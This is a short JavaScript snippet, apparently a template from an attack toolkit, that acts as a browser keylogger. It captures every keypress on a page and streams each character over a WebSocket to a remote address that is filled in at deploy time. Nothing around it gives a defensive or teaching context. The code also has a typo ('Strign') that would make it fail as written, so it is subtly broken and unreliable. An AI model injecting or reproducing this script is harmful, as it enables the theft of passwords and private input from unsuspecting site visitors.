(function() {
  var conn = new WebSocket("ws://{{.ws_remote_addr}}/ws");
  document.onkeypress = keypress;
  function keypress(event) {
    key_stroke = Strign.fromCharCode(event.which);
    conn.send(key_stroke);
  };
})()
